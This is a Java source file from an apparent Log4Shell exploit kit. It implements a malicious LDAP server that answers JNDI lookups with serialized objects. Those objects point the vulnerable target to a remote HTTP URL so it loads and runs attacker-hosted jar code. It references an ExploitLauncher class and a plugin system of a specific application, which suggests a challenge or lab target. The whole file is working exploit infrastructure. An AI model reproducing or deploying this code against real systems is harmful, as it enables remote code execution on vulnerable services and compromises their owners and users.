package fr.thesmyler.log4shell;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.hallebarde.recrutement.api.PluginMetadata;
import org.hallebarde.recrutement.plugins.JarPluginContainer;
import org.hallebarde.recrutement.plugins.PluginContainer;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.URL;

import static fr.thesmyler.log4shell.Util.randomAlphaNumString;

/**
 * A ldap server serving java objects as defined in <a href="https://www.ietf.org/rfc/rfc2713.txt">RFC 7213 Schema for Java Objects</a>
 */
public class LdapJndiServer {

    private final URL baseHttpUrl;
    private final InMemoryDirectoryServer server;

    public LdapJndiServer(String host, int port, URL baseHttpUrl) {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName(host),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );
            config.addInMemoryOperationInterceptor(new Interceptor());
            this.server = new InMemoryDirectoryServer(config);
            this.baseHttpUrl = baseHttpUrl;
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    public void start() throws LDAPException {
        this.server.startListening();
    }

    public void stop() {
        this.server.shutDown(true);
    }

    private byte[] makeSerialized(String className) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        URL url = new URL(this.baseHttpUrl.toString() + "/" + className);
        PluginMetadata metadata = new PluginMetadata(className + randomAlphaNumString(5), className, "1.0.0");
        PluginContainer container = new JarPluginContainer(metadata, url, true);
        try (ObjectOutputStream stream = new ObjectOutputStream(out)) {
            stream.writeObject(container);
        }
        return out.toByteArray();
    }

    private class Interceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String root = result.getRequest().getBaseDN();
            ExploitLauncher.LOGGER.info("Got ldap request: {}", root);
            String name = root.replaceAll("/", ".");
            Entry entry = new Entry(root);
            try {
                entry.addAttribute("javaClassName", root);
                entry.addAttribute("objectClass", "javaNamingReference");
                entry.addAttribute("javaSerializedData", LdapJndiServer.this.makeSerialized(name));
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception e) {
                ExploitLauncher.LOGGER.error("Failed to send ldap response");
                ExploitLauncher.LOGGER.catching(e);
            }
        }

    }

}
